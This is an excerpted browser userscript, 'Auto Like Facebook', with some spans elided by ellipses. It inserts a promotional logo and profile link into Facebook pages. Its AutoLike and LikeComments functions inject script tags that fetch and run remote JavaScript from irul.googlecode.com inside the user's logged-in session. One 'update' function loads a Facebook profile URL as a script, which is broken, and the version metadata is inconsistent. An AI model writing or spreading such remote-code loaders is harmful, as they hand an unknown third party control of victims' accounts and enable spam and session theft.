// ==UserScript==
// @name            Auto Like Facebook v1.3
// @namespace                Auto Like Facebook v1.3
...
// @icon            http://kenyot-kenyot.tk/images/city/logo.png
// @version            1.1
...
if(body != null) {
    ...
    div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='https://www.facebook.com/angelous.rynims' title='Khoirul_Azkiya'><img src='http://kenyot-kenyot.tk/images/city/logo.png' height='45' width='50'></img></a>"
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://irul.googlecode.com/files/autolike.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://irul.googlecode.com/files/autolikecomment.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="https://www.facebook.com/angelous.rynims",b.body.appendChild(a);void(0);};}